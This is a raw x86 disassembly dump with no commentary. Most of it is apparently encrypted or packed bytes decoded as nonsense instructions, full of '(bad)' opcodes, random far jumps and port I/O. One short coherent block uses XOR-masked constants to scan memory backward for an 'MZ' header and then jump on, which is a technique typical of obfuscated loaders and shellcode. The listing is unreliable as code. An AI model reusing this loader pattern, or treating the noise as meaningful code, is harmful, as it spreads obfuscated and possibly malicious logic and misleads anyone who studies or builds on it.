  40bfc4:	shr    BYTE PTR [esi+eiz*4-0x6e146c7b],1
  40bfcb:	sub    al,0x31
  40bfcd:	add    DWORD PTR [edx],eax
  40bfcf:	inc    ebp
  40bfd0:	jne    0x40c02d
  40bfd2:	lods   eax,DWORD PTR ds:[esi]
  40bfd3:	mov    ecx,0x5e271d17
  40bfd8:	stos   BYTE PTR es:[edi],al
  40bfd9:	mov    ch,dl
  40bfdb:	call   0x94a8:0x6bffb067
  40bfe2:	push   ebp
  40bfe3:	retf   0xfcbb
  40bfe6:	fild   WORD PTR [esi+0x796988fc]
  40bfec:	lea    esi,[ebx+0x35b49fa7]
  40bff2:	sbb    esp,ebx
  40bff4:	dec    edx
  40bff5:	rcl    DWORD PTR [esi-0x2fa116ac],0x25
  40bffc:	ins    DWORD PTR es:[edi],dx
  40bffd:	mov    ebx,0xd762732d
  40c002:	xchg   DWORD PTR [ebp+0x15fbf4d2],ebx
  40c008:	jg     0x40c049
  40c00a:	xchg   ebp,eax
  40c00b:	arpl   WORD PTR [eax-0x1710c6a8],di
  40c011:	xlat   BYTE PTR ds:[ebx]
  40c012:	cmp    ecx,DWORD PTR [ebx]
  40c014:	scas   al,BYTE PTR es:[edi]
  40c015:	jmp    0x2120356f
  40c01a:	fmul   st,st(2)
  40c01c:	sub    BYTE PTR [esp+ecx*2+0x35],bl
  40c020:	jl     0x40c010
  40c022:	add    ch,BYTE PTR [ecx+edi*1+0x2de1179f]
  40c029:	mov    dl,0x34
  40c02b:	bound  esp,QWORD PTR [esp+esi*8-0x13d36e95]
  40c032:	add    ch,ch
  40c034:	sahf   
  40c035:	les    ebx,FWORD PTR [edx+0x4e]
  40c038:	pusha  
  40c039:	adc    cl,bl
  40c03b:	jne    0x40bfdd
  40c03d:	test   ebx,edx
  40c03f:	data16 fsub DWORD PTR [esp+ecx*4]
  40c043:	xchg   esp,eax
  40c044:	dec    edi
  40c045:	fisubr DWORD PTR [ecx-0x57367db]
  40c04b:	rcr    DWORD PTR [ebp-0x3d6158ff],1
  40c051:	jno    0x40c08d
  40c053:	in     al,0x33
  40c055:	cmp    esi,DWORD PTR [ebx]
  40c057:	adc    eax,0x715a1b7a
  40c05c:	out    0x8,al
  40c05e:	mov    DWORD PTR [ecx+0x2c],edx
  40c061:	test   DWORD PTR [ecx+0x360fb5f0],edi
  40c067:	mov    ebp,0x72c6496c
  40c06c:	ds pushf 
  40c06e:	dec    edx
  40c06f:	es leave 
  40c071:	xchg   esp,eax
  40c072:	sahf   
  40c073:	jb     0x40c081
  40c075:	es stos DWORD PTR es:[edi],eax
  40c077:	dec    edi
  40c078:	dec    edi
  40c079:	or     dl,BYTE PTR [esi+ebp*8]
  40c07c:	jle    0x40c068
  40c07e:	rol    esi,0x7b
  40c081:	push   es
  40c082:	clc    
  40c083:	imul   edi,DWORD PTR [ecx+0xa],0xb3da4b5c
  40c08a:	mov    esi,0xecf005b4
  40c08f:	cmp    al,0x44
  40c091:	addr16 into 
  40c093:	push   ebx
  40c094:	(bad)  
  40c095:	cmp    BYTE PTR [esi+0x104c2426],bl
  40c09b:	xchg   edi,eax
  40c09c:	dec    ecx
  40c09d:	inc    edx
  40c09e:	push   0xb70f35a0
  40c0a3:	mov    esp,0x60daed7d
  40c0a8:	mov    ebx,0xabd86e7
  40c0ad:	sbb    BYTE PTR [ebx+0x51],cl
  40c0b0:	add    BYTE PTR [eax-0x2c636442],dl
  40c0b6:	rcl    DWORD PTR [edx-0x2ff332ce],0x76
  40c0bd:	inc    esp
  40c0be:	add    eax,0x96cc48af
  40c0c3:	jge    0x40c0d6
  40c0c5:	inc    ebp
  40c0c6:	cli    
  40c0c7:	jno    0x40c053
  40c0c9:	pop    ebp
  40c0ca:	push   0xac24bea7
  40c0cf:	mov    BYTE PTR [edx-0x2903a741],dh
  40c0d5:	rcl    DWORD PTR ds:0xb7df1cbb,1
  40c0db:	stos   DWORD PTR es:[edi],eax
  40c0dc:	fild   DWORD PTR [ebp-0x2dd0d879]
  40c0e2:	nop
  40c0e3:	pusha  
  40c0e4:	cmp    al,0x51
  40c0e6:	(bad)  
  40c0e7:	pop    esp
  40c0e8:	rcl    BYTE PTR [esi+0x3f],cl
  40c0eb:	push   edx
  40c0ec:	mov    ecx,0x713be38b
  40c0f1:	mov    bl,0xbf
  40c0f3:	jle    0x40c0ad
  40c0f5:	cmp    DWORD PTR [ebx+0x365d5e33],eax
  40c0fb:	or     cl,al
  40c0fd:	and    ebx,esp
  40c0ff:	mov    esp,0xbc75a030
  40c104:	adc    eax,0xec39ce8
  40c10a:	fst    DWORD PTR [eax-0x70]
  40c10d:	mov    al,0x2f
  40c10f:	retf   
  40c110:	and    DWORD PTR [ebp+ecx*4+0x5268caa3],ecx
  40c117:	sbb    cl,dh
  40c119:	sub    dl,BYTE PTR [ebp-0x7e1b3c51]
  40c11f:	push   cs
  40c120:	or     esi,DWORD PTR [ebx]
  40c122:	sbb    al,0x10
  40c124:	fstp   TBYTE PTR [ebx+0x5]
  40c127:	rol    ch,0x96
  40c12a:	aas    
  40c12b:	push   ds
  40c12c:	or     ah,BYTE PTR [ebx-0x4b3f616f]
  40c132:	neg    BYTE PTR [ecx-0x18e2d21c]
  40c138:	pop    es
  40c139:	es pop es
  40c13b:	pushf  
  40c13c:	cwde   
  40c13d:	test   eax,0xb0ab205c
  40c142:	push   0x63
  40c144:	lahf   
  40c145:	fsubr  QWORD PTR [eax]
  40c147:	sbb    eax,ebx
  40c149:	mov    bh,0x1a
  40c14b:	push   0xffffffa2
  40c14d:	cdq    
  40c14e:	cmp    edx,edx
  40c150:	ins    BYTE PTR es:[edi],dx
  40c151:	jbe    0x40c13e
  40c153:	adc    cl,ah
  40c155:	outs   dx,DWORD PTR ds:[esi]
  40c156:	jecxz  0x40c1ad
  40c158:	test   DWORD PTR [esi+0x3057b04a],edx
  40c15e:	push   es
  40c15f:	add    esi,edi
  40c161:	push   ebp
  40c162:	mov    ss,WORD PTR [edi+0x47a62792]
  40c168:	in     eax,0xb0
  40c16a:	ret    
  40c16b:	xor    edi,0x7e
  40c16e:	data16 int3 
  40c170:	and    eax,0x10d0fa9b
  40c175:	jle    0x40c194
  40c177:	fisub  WORD PTR [ebp+0x5b]
  40c17a:	shl    DWORD PTR [ecx+0x3c],1
  40c17d:	sbb    ebx,DWORD PTR [eax-0x53c0db36]
  40c183:	or     ecx,DWORD PTR ds:0x32b92afb
  40c189:	out    0xbb,al
  40c18b:	cmp    al,0x50
  40c18d:	jmp    0xceb5:0xb37aa7f8
  40c194:	mov    ds:0xc9f3cf5b,eax
  40c199:	fild   DWORD PTR [ecx]
  40c19b:	and    bh,BYTE PTR [edx]
  40c19d:	inc    ecx
  40c19e:	inc    esp
  40c19f:	xor    DWORD PTR [ebp+0x68],ebp
  40c1a2:	pushf  
  40c1a3:	enter  0xcf6b,0x74
  40c1a7:	fwait
  40c1a8:	call   0x7968:0xaf8057aa
  40c1af:	hlt    
  40c1b0:	retf   
  40c1b1:	pop    ebp
  40c1b2:	adc    eax,0xe05602ab
  40c1b7:	push   cs
  40c1b8:	sub    eax,0xe120c12b
  40c1bd:	fwait
  40c1be:	call   0xb502:0x10fecfdf
  40c1c5:	jmp    0x40c1d2
  40c1c7:	test   al,0x1
  40c1c9:	cld    
  40c1ca:	push   esp
  40c1cb:	adc    esi,DWORD PTR [ebx-0x4c]
  40c1ce:	(bad)  
  40c1cf:	clts   
  40c1d1:	add    ebx,DWORD PTR [edi+0xe6baa65]
  40c1d7:	mov    esp,DWORD PTR [edi-0x10]
  40c1da:	mov    ebx,0x886fad00
  40c1df:	mov    ecx,0xa245d238
  40c1e4:	hlt    
  40c1e5:	jne    0x40c1a3
  40c1e7:	aam    0x98
  40c1e9:	and    BYTE PTR [eax-0x43],al
  40c1ec:	mov    ebx,0x9ef15639
  40c1f1:	adc    BYTE PTR [ebx-0x73],ah
  40c1f4:	inc    eax
  40c1f5:	xrelease mov BYTE PTR [ebp+0x207d7a4e],ch
  40c1fc:	popa   
  40c1fd:	loopne 0x40c27d
  40c1ff:	add    al,0x2
  40c201:	xchg   esp,eax
  40c202:	mul    BYTE PTR [edi]
  40c204:	inc    ebp
  40c205:	xchg   ecx,eax
  40c206:	neg    BYTE PTR [esi+0x76]
  40c209:	aaa    
  40c20a:	fistp  QWORD PTR [ebx]
  40c20c:	sub    esp,DWORD PTR [eax+0x67]
  40c20f:	ret    0x1885
  40c212:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c213:	retf   
  40c214:	inc    edx
  40c215:	pop    edi
  40c216:	xor    esi,ecx
  40c218:	clc    
  40c219:	fisttp DWORD PTR [edx]
  40c21b:	mov    bl,BYTE PTR [ebx]
  40c21d:	out    0x5b,eax
  40c21f:	out    dx,eax
  40c220:	pop    edi
  40c221:	(bad)  
  40c222:	ins    BYTE PTR es:[edi],dx
  40c223:	jmp    0x40c28b
  40c225:	or     ecx,DWORD PTR [ecx-0x2b]
  40c228:	push   0x71c495f5
  40c22d:	aam    0xf1
  40c22f:	mov    al,ds:0x5e2ee45b
  40c234:	ss test esp,esp
  40c237:	jne    0x40c28f
  40c239:	jns    0x40c236
  40c23b:	mov    esp,0xfe1cf530
  40c240:	sar    BYTE PTR [edx+0x4b],1
  40c243:	pop    es
  40c244:	retf   
  40c245:	pop    eax
  40c246:	inc    esp
  40c247:	xchg   ebp,eax
  40c248:	sub    DWORD PTR [esi],esi
  40c24a:	scas   eax,DWORD PTR es:[edi]
  40c24b:	adc    al,0xfe
  40c24d:	jb     0x40c2c5
  40c24f:	pop    ebx
  40c250:	mov    esi,0xc1f5209b
  40c255:	fisttp QWORD PTR [edx-0xb0ac197]
  40c25b:	add    ecx,DWORD PTR ds:0x2e0ff2fd
  40c261:	push   cs
  40c262:	xchg   esp,eax
  40c263:	push   esp
  40c264:	(bad)  
  40c265:	call   0xd52d:0xeed43a48
  40c26c:	mov    dh,0xa4
  40c26e:	aad    0xa9
  40c270:	xlat   BYTE PTR ds:[ebx]
  40c271:	push   edx
  40c272:	outs   dx,DWORD PTR ds:[esi]
  40c273:	jb     0x40c23c
  40c275:	nop
  40c276:	mov    ds:0x71d2dd12,eax
  40c27b:	dec    edx
  40c27c:	pushf  
  40c27d:	repnz imul esi,esp,0x6aa6b005
  40c284:	in     al,0x6e
  40c286:	rcl    bl,0x6d
  40c289:	imul   esp,DWORD PTR [eax+0x1c],0x67
  40c28d:	ror    BYTE PTR [esi+0xa],0x5a
  40c291:	and    ebp,eax
  40c293:	pop    ds
  40c294:	loop   0x40c24f
  40c296:	(bad)  
  40c297:	repz loopne 0x40c2b6
  40c29a:	mov    dh,0x3e
  40c29c:	arpl   WORD PTR [ebp-0x418afd07],ax
  40c2a2:	(bad)  
  40c2a3:	fs xchg esp,eax
  40c2a5:	mov    al,ds:0x6e66bf4f
  40c2aa:	pop    ebx
  40c2ab:	fnstenv [eax+0x55]
  40c2ae:	mov    bl,0xcd
  40c2b0:	popa   
  40c2b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2b2:	mov    ebx,0x29b64f81
  40c2b7:	xor    DWORD PTR [ebp-0x740c31d2],ebp
  40c2bd:	inc    ecx
  40c2be:	mov    ds:0xe62ac08b,eax
  40c2c3:	and    edi,ecx
  40c2c5:	dec    eax
  40c2c6:	iret   
  40c2c7:	or     eax,0x46f5a20e
  40c2cc:	call   0xed5d:0x6c9ad44b
  40c2d3:	mov    bl,0xe5
  40c2d5:	js     0x40c27b
  40c2d7:	mov    eax,ds:0x3fdf5c43
  40c2dc:	inc    edi
  40c2dd:	out    0x32,al
  40c2df:	jno    0x40c33b
  40c2e1:	(bad)
  40c2e4:	push   ebp
  40c2e5:	pop    ebp
  40c2e6:	sbb    BYTE PTR [eax+0x33],0xfa
  40c2ea:	imul   esp,DWORD PTR [edi],0x6a
  40c2ed:	and    eax,0x5a6fccaa
  40c2f2:	test   eax,0x954c6ed4
  40c2f7:	xchg   ebp,eax
  40c2f8:	add    al,ah
  40c2fa:	or     DWORD PTR [ecx-0x15],edx
  40c2fd:	imul   ecx,esp,0x16
  40c300:	and    DWORD PTR [ecx+eax*8],esi
  40c303:	add    al,0xb1
  40c305:	mov    ah,0xc9
  40c307:	int3   
  40c308:	and    ch,BYTE PTR [eax]
  40c30a:	xor    DWORD PTR [edx-0x3a9f5b29],esp
  40c310:	imul   edx,DWORD PTR [ebx-0x51],0xfffffff2
  40c314:	inc    ecx
  40c315:	mov    eax,ds:0xef78475a
  40c31a:	retf   
  40c31b:	mov    ?,WORD PTR [ebp+0x34]
  40c31e:	int    0x29
  40c320:	sub    ah,dl
  40c322:	jb     0x40c348
  40c324:	rcl    ah,1
  40c326:	ret    
  40c327:	out    dx,eax
  40c328:	push   ss
  40c329:	imul   ebp,DWORD PTR [eax-0x73cbd6c5],0xfe17e57a
  40c333:	sar    BYTE PTR [ecx+0x57],0xcf
  40c337:	ja     0x40c304
  40c339:	jg     0x40c386
  40c33b:	pop    eax
  40c33c:	push   edi
  40c33d:	pop    esp
  40c33e:	test   eax,0xd64e15b5
  40c343:	ins    BYTE PTR es:[edi],dx
  40c344:	jg     0x40c397
  40c346:	inc    esp
  40c347:	jmp    0xd32b:0xff38c535
  40c34e:	scas   al,BYTE PTR es:[edi]
  40c34f:	sbb    dh,BYTE PTR [edx+0x7727a2db]
  40c355:	jns    0x40c31a
  40c357:	iret   
  40c358:	pop    edi
  40c359:	fsubrp st(6),st
  40c35b:	mov    esi,0x7f942c98
  40c360:	mov    esp,0xc7ae8fbe
  40c365:	pop    ebx
  40c366:	and    ch,al
  40c368:	fisubr WORD PTR [ecx+0x108c14fb]
  40c36e:	xchg   DWORD PTR [eax],ecx
  40c370:	mov    eax,0x51e9011a
  40c375:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c376:	adc    ch,BYTE PTR [ecx]
  40c378:	cmp    al,0x1e
  40c37a:	xchg   esp,eax
  40c37b:	ds out 0x7,al
  40c37e:	jnp    0x40c313
  40c380:	ja     0x40c334
  40c382:	dec    edi
  40c383:	add    DWORD PTR [esi],esi
  40c385:	and    cl,BYTE PTR [eax+0xe]
  40c388:	not    DWORD PTR [ebp+0x513a4d76]
  40c38e:	lods   al,BYTE PTR ds:[esi]
  40c38f:	jle    0x40c354
  40c391:	sbb    eax,0x4acfcd07
  40c396:	nop
  40c397:	loopne 0x40c357
  40c399:	retf   0xcffe
  40c39c:	imul   ebp,DWORD PTR [eax],0x2
  40c39f:	adc    al,0xa2
  40c3a1:	stos   DWORD PTR es:[edi],eax
  40c3a2:	sub    ebx,edi
  40c3a4:	sbb    bh,ah
  40c3a6:	mov    edi,0x988f5fb7
  40c3ab:	not    BYTE PTR [ecx+ecx*2+0x33]
  40c3af:	xor    BYTE PTR [edx+ecx*4-0x51614aff],cl
  40c3b6:	retf   0xee61
  40c3b9:	imul   eax,DWORD PTR [edi-0x6c],0xb
  40c3bd:	pop    edi
  40c3be:	cmp    eax,0xf4ddff53
  40c3c3:	cmp    ebx,DWORD PTR [esi+0x6f]
  40c3c6:	push   ebx
  40c3c7:	add    BYTE PTR [edx],0x9d
  40c3ca:	dec    edx
  40c3cb:	fdiv   st(4),st
  40c3cd:	xor    al,BYTE PTR [esi+0x6d79eb75]
  40c3d3:	ss dec edx
  40c3d5:	mov    dh,0x93
  40c3d7:	imul   edi,ebx,0x76c3961a
  40c3dd:	shr    DWORD PTR [eax],cl
  40c3df:	stos   BYTE PTR es:[edi],al
  40c3e0:	xor    cl,BYTE PTR [ecx]
  40c3e2:	je     0x40c40c
  40c3e4:	push   eax
  40c3e5:	mov    ebp,0xdbd06df5
  40c3ea:	dec    ecx
  40c3eb:	mov    gs,esp
  40c3ed:	pop    esp
  40c3ee:	adc    ecx,DWORD PTR [ecx+ebp*1+0x11]
  40c3f2:	test   esp,0x314567ad
  40c3f8:	cdq    
  40c3f9:	xchg   DWORD PTR [esi],esp
  40c3fb:	mov    ecx,ds
  40c3fd:	xor    dh,BYTE PTR [esi]
  40c3ff:	enter  0x11f1,0x48
  40c403:	fdivr  st(6),st
  40c405:	pop    ebp
  40c406:	jl     0x40c3f3
  40c408:	cwde   
  40c409:	les    ebp,FWORD PTR [edi]
  40c40b:	addr16 in eax,dx
  40c40d:	pop    edi
  40c40e:	int    0x9c
  40c410:	test   DWORD PTR ds:0xb7d6476d,eax
  40c416:	inc    ebp
  40c417:	jnp    0x40c460
  40c419:	xor    BYTE PTR [ebx+0xc35a211],dl
  40c41f:	pop    edi
  40c420:	or     esp,DWORD PTR [edi+0x43d156fe]
  40c426:	(bad)  
  40c427:	adc    DWORD PTR [ebx],eax
  40c429:	add    bh,BYTE PTR ds:0x104a56e9
  40c42f:	cld    
  40c430:	mov    ch,0xc0
  40c432:	stc    
  40c433:	lea    eax,[edi-0x7e070a95]
  40c439:	shl    BYTE PTR [edx+0x6cb5f4d0],1
  40c43f:	ins    DWORD PTR es:[edi],dx
  40c440:	dec    ebp
  40c441:	fidivr WORD PTR [ebp-0x11]
  40c444:	repz mov esi,0xd4014c0
  40c44a:	cwde   
  40c44b:	xor    al,0x5c
  40c44d:	sub    al,0x37
  40c44f:	jmp    0x42d6fb64
  40c454:	mov    es,WORD PTR ds:0xc4d8e869
  40c45a:	ror    BYTE PTR [edi],cl
  40c45c:	fs cld 
  40c45e:	push   esp
  40c45f:	mov    al,0xeb
  40c461:	sub    DWORD PTR [edi],0x19de8629
  40c467:	ds and bl,al
  40c46a:	cdq    
  40c46b:	jne    0x40c481
  40c46d:	mov    cl,0x34
  40c46f:	std    
  40c470:	ret    
  40c471:	cmp    eax,0xadad8634
  40c476:	fdivr  QWORD PTR [ebx+edi*2]
  40c479:	jmp    FWORD PTR [esi+edx*4]
  40c47c:	pop    ds
  40c47d:	jmp    0x2fe9:0xb1349280
  40c484:	loope  0x40c4de
  40c486:	scas   eax,DWORD PTR es:[edi]
  40c487:	outs   dx,BYTE PTR fs:[esi]
  40c489:	xchg   edi,eax
  40c48a:	je     0x40c47a
  40c48c:	fstp   TBYTE PTR [esi]
  40c48e:	and    al,0x72
  40c490:	cs mov ecx,esi
  40c493:	outs   dx,DWORD PTR ds:[esi]
  40c494:	test   BYTE PTR [eax],bh
  40c496:	jmp    0x1dea:0x59c09326
  40c49d:	adc    BYTE PTR [edi-0x5b910751],dh
  40c4a3:	out    0xbe,al
  40c4a5:	(bad)  
  40c4a6:	mov    DWORD PTR [ebp-0x3a0bc2d4],ecx
  40c4ac:	jmp    0xfbc1:0xf326dadc
  40c4b3:	fnstenv [esp+edi*8+0x2]
  40c4b7:	cmp    BYTE PTR [ebx],cl
  40c4b9:	mov    ebp,0xfbaa01a1
  40c4be:	mov    dl,0x22
  40c4c0:	mov    al,0x1d
  40c4c2:	xchg   BYTE PTR [eax+0x295cf6ae],bh
  40c4c8:	fist   WORD PTR [eax+0x6da4da97]
  40c4ce:	xor    al,0xc4
  40c4d0:	xor    dh,BYTE PTR [edx]
  40c4d2:	or     ah,dh
  40c4d4:	sbb    eax,0x4f464a6c
  40c4d9:	int    0x2b
  40c4db:	dec    esp
  40c4dc:	jns    0x40c4bd
  40c4de:	call   0x2d01:0x1da10b88
  40c4e5:	fwait
  40c4e6:	jb     0x40c498
  40c4e8:	std    
  40c4e9:	sub    DWORD PTR [edi+0x6dfa5ac9],ebx
  40c4ef:	and    BYTE PTR [ebp+ebp*2+0x41],ah
  40c4f3:	aam    0xf8
  40c4f5:	mov    ecx,0x299d21a2
  40c4fa:	xchg   ecx,eax
  40c4fb:	int    0x2c
  40c4fd:	mov    ch,dh
  40c4ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c500:	jle    0x40c512
  40c502:	(bad)  
  40c503:	dec    esp
  40c504:	push   edi
  40c505:	inc    ecx
  40c506:	push   0x6b
  40c508:	jge    0x40c51f
  40c50a:	test   al,0xe1
  40c50c:	xchg   esi,eax
  40c50d:	cmp    BYTE PTR [eax],bh
  40c50f:	or     BYTE PTR [ecx-0x76a1079b],0xcf
  40c516:	add    al,0x1c
  40c518:	push   cs
  40c519:	fisttp DWORD PTR [ecx]
  40c51b:	push   eax
  40c51c:	ins    DWORD PTR es:[edi],dx
  40c51d:	js     0x40c509
  40c51f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c520:	arpl   WORD PTR [edi-0x7a2ca3bf],bp
  40c526:	jl     0x40c506
  40c528:	inc    ebx
  40c529:	or     cl,BYTE PTR [ecx-0x44]
  40c52c:	mov    esp,0x622e9001
  40c531:	jmp    0x9963:0x40b573d9
  40c538:	not    DWORD PTR [ecx+0x7dda4e26]
  40c53e:	push   esp
  40c53f:	push   ss
  40c540:	dec    esp
  40c541:	imul   esi,eax,0x4c
  40c544:	ror    DWORD PTR [ebp+0x7ca63f6e],cl
  40c54a:	mov    edi,0xca0788c8
  40c54f:	outs   dx,BYTE PTR ds:[esi]
  40c550:	(bad)  
  40c551:	sbb    eax,DWORD PTR ss:[edi+0x1c56adc8]
  40c558:	mov    dl,0x6e
  40c55a:	in     eax,dx
  40c55b:	or     eax,DWORD PTR [edi+edi*8-0x62]
  40c55f:	std    
  40c560:	or     dl,ah
  40c562:	mov    al,0xce
  40c564:	cld    
  40c565:	retf   0xd594
  40c568:	dec    ebp
  40c569:	in     al,dx
  40c56a:	xor    DWORD PTR [esi-0x14],ebx
  40c56d:	push   ebx
  40c56e:	jmp    0x40c581
  40c570:	(bad)  
  40c571:	sub    edi,DWORD PTR [edi]
  40c573:	inc    ecx
  40c574:	imul   eax,ecx,0x5120d5df
  40c57a:	mov    ah,0xc8
  40c57c:	into   
  40c57d:	sar    BYTE PTR [ebx],0x55
  40c580:	pushf  
  40c581:	sbb    ch,BYTE PTR [edi]
  40c583:	jnp    0x40c523
  40c585:	cmp    edx,eax
  40c587:	jns    0x40c52e
  40c589:	mov    ?,WORD PTR [esi-0x24]
  40c58c:	sbb    eax,0x89380314
  40c591:	jge    0x40c58b
  40c593:	mov    eax,DWORD PTR [ebp+0xc]
  40c596:	mov    edi,DWORD PTR [ebp+0xc]
  40c599:	xor    edi,ecx
  40c59b:	xor    eax,ecx
  40c59d:	lea    eax,[eax+edi*1+0x64e5c4]
  40c5a4:	mov    edi,DWORD PTR [ebp+0xc]
  40c5a7:	xor    edi,ecx
  40c5a9:	add    edi,edx
  40c5ab:	imul   eax,edi
  40c5ae:	mov    edi,DWORD PTR [ebp+0xc]
  40c5b1:	xor    edi,ecx
  40c5b3:	sub    edi,eax
  40c5b5:	mov    eax,DWORD PTR [ebp-0x4]
  40c5b8:	add    edi,edx
  40c5ba:	cmp    DWORD PTR [eax],edi
  40c5bc:	mov    eax,DWORD PTR [ebp-0x4]
  40c5bf:	mov    edi,DWORD PTR [ebp+0x10]
  40c5c2:	jg     0x40c5d5
  40c5c8:	xor    edi,ecx
  40c5ca:	mov    ebx,esi
  40c5cc:	sub    ebx,edi
  40c5ce:	add    DWORD PTR [eax],ebx
  40c5d0:	jmp    0x40c5db
  40c5d5:	xor    edi,ecx
  40c5d7:	add    edi,edx
  40c5d9:	add    DWORD PTR [eax],edi
  40c5db:	mov    eax,DWORD PTR [ebp-0x8]
  40c5de:	mov    edi,DWORD PTR [ebp-0x10]
  40c5e1:	mov    eax,DWORD PTR [eax]
  40c5e3:	xor    edi,ecx
  40c5e5:	add    edi,0x3272e1
  40c5eb:	not    edi
  40c5ed:	and    eax,edi
  40c5ef:	movsx  di,BYTE PTR [eax+0x1]
  40c5f4:	mov    ebx,0x3b51
  40c5f9:	sub    di,bx
  40c5fc:	mov    ebx,0x8a8d
  40c601:	xor    di,bx
  40c604:	mov    ebx,0x4f84
  40c609:	cmp    di,bx
  40c60c:	jne    0x40c634
  40c612:	movsx  di,BYTE PTR [eax]
  40c616:	mov    ebx,0x3b51
  40c61b:	sub    di,bx
  40c61e:	mov    ebx,0x8a8d
  40c623:	xor    di,bx
  40c626:	mov    ebx,0x4e71
  40c62b:	cmp    di,bx
  40c62e:	je     0x40c644
  40c634:	mov    edi,DWORD PTR [ebp-0x10]
  40c637:	xor    edi,ecx
  40c639:	mov    ebx,esi
  40c63b:	sub    ebx,edi
  40c63d:	add    eax,ebx
  40c63f:	jmp    0x40c5ef
  40c644:	mov    esi,DWORD PTR [ebp-0x14]
  40c647:	mov    esi,DWORD PTR [esi]
  40c649:	jmp    0x40e998
  40c64e:	dec    edi
  40c64f:	sub    edi,esi
  40c651:	pusha  
  40c652:	repz inc edx
  40c654:	or     esi,ebx
  40c656:	test   eax,0xc24b873c
  40c65b:	inc    ebx
  40c65c:	pop    esp
  40c65d:	arpl   WORD PTR [edx+0x4e7c7ce0],sp
  40c663:	pop    edi
  40c664:	jl     0x40c6e2
  40c666:	js     0x40c637
  40c668:	add    DWORD PTR [esi+ebp*8],edx
  40c66b:	cmp    al,0xe1
  40c66d:	shl    DWORD PTR [edi-0x227077c8],0x83
  40c674:	pop    eax
  40c675:	pop    esi
  40c676:	or     DWORD PTR [esi+0x10],0xd6f49e01
  40c67d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c67e:	in     al,dx
  40c67f:	mov    al,ds:0x1acc6da5
  40c684:	jno    0x40c61d
  40c686:	pop    ecx
  40c687:	fcmovbe st,st(0)
  40c689:	es mov esi,esi
  40c68c:	and    esi,DWORD PTR ds:0xcc018da2
  40c692:	xchg   ebp,eax
  40c693:	inc    ecx
  40c694:	xor    al,bl
  40c696:	lds    edi,FWORD PTR [eax-0x50]
  40c699:	bound  esp,QWORD PTR [ebp+0x6f]
  40c69c:	mov    cs,WORD PTR [ebp-0x71]
  40c69f:	mov    cl,0x71
  40c6a1:	das    
  40c6a2:	xor    al,0x4e
  40c6a4:	jbe    0x40c6f3
  40c6a6:	jae    0x40c65f
  40c6a8:	sub    ch,BYTE PTR [ecx]
  40c6aa:	pop    ebx
  40c6ab:	(bad)  
  40c6ad:	shr    DWORD PTR [ecx+esi*4-0xe4e3868],1
  40c6b4:	pop    ebx
  40c6b5:	xor    DWORD PTR [esp+ebp*1],esi
  40c6b8:	gs or  al,0x79
  40c6bb:	inc    eax
  40c6bc:	rcr    BYTE PTR [ebp+0x2eae29de],0xf6
  40c6c3:	add    al,0xe2
  40c6c6:	or     ebp,esi
  40c6c8:	mov    DWORD PTR [edi-0x54],eax
  40c6cb:	clc    
  40c6cc:	aam    0xe1
  40c6ce:	lods   al,BYTE PTR ds:[esi]
  40c6cf:	test   eax,0x2a4c17b5
  40c6d4:	mov    al,ds:0xad60d3f1
  40c6d9:	(bad)  
  40c6da:	xor    al,0x27
  40c6dc:	cmp    eax,0xf6b98f09
  40c6e1:	mov    es,eax
  40c6e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c6e4:	mov    esp,0xe34ad864
  40c6e9:	int    0xf5
  40c6eb:	adc    DWORD PTR [edx],ebp
  40c6ed:	cmp    ebp,ebp
  40c6ef:	enter  0x86af,0x18
  40c6f3:	dec    DWORD PTR [ebx+0x6f6d7d32]
  40c6f9:	cwde   
  40c6fa:	xchg   BYTE PTR [edi],dh
  40c6fc:	out    0x16,eax
  40c6fe:	mov    bl,0x77
  40c700:	(bad)  
  40c701:	cdq    
  40c702:	mov    cl,0xdc
  40c704:	mov    ds:0x282d546c,eax
  40c709:	mov    cl,0x8a
  40c70b:	je     0x40c71c
  40c70d:	hlt    
  40c70e:	add    al,ch
  40c710:	mov    esp,0x4c49816b
  40c715:	and    edi,ebp
  40c717:	out    0xc8,eax
  40c719:	xchg   ecx,eax
  40c71a:	push   cs
  40c71b:	adc    BYTE PTR [edx],bl
  40c71d:	fbld   TBYTE PTR [esi]
  40c71f:	xchg   ebx,eax
  40c720:	cmp    DWORD PTR [edi-0x27a2f441],edi
  40c726:	mov    ds:0x324d9196,al
  40c72b:	push   ebx
  40c72c:	jg     0x40c703
  40c72e:	adc    eax,0x2d6c9c96
  40c733:	sub    al,0x5f
  40c735:	cmc    
  40c736:	sbb    ah,cl
  40c738:	xor    ah,BYTE PTR ds:0xd36c43c1
  40c73e:	outs   dx,BYTE PTR ds:[esi]
  40c73f:	icebp  
  40c740:	lods   eax,DWORD PTR ds:[esi]
  40c741:	push   0xc3bf7d25
  40c746:	xchg   BYTE PTR [edx-0x116bdffa],bh
  40c74c:	inc    edi
  40c74d:	sahf   
  40c74e:	inc    ecx
  40c74f:	sub    BYTE PTR [ebx+ebp*8+0x1795025e],bl
  40c756:	ds cmp eax,0x1cd96336
  40c75c:	xor    edi,DWORD PTR [ecx+0x41]
  40c75f:	ret    
  40c760:	mov    edi,cs
  40c762:	aam    0x35
  40c764:	inc    edx
  40c765:	enter  0xc043,0xc7
  40c769:	xlat   BYTE PTR ds:[ebx]
  40c76a:	int    0x49
  40c76c:	jae    0x40c7da
  40c76e:	cmp    ebp,DWORD PTR [esi]
  40c770:	mov    dl,0x9d
  40c772:	mov    al,ds:0x14db3120
  40c777:	push   cs
  40c778:	sbb    BYTE PTR [ebp-0x154f2cb],bh
  40c77e:	or     eax,0x5a9a8ec1
  40c783:	mov    DWORD PTR [eax*2+0x7bb39a7e],esi
  40c78a:	daa    
  40c78b:	ins    DWORD PTR es:[edi],dx
  40c78c:	xchg   ecx,eax
  40c78d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c78e:	and    DWORD PTR [edx+0x62],edi
  40c791:	out    dx,al
  40c792:	xchg   ebx,eax
  40c793:	adc    BYTE PTR [eax+0xd],al
  40c796:	jmp    0x40c80d
  40c798:	cs jo  0x40c7b7
  40c79b:	mov    esp,0x29e354ea
  40c7a0:	imul   edx,esi,0xd1342f10
  40c7a6:	xchg   ebp,eax
  40c7a7:	int3   
  40c7a8:	mov    ah,0x81
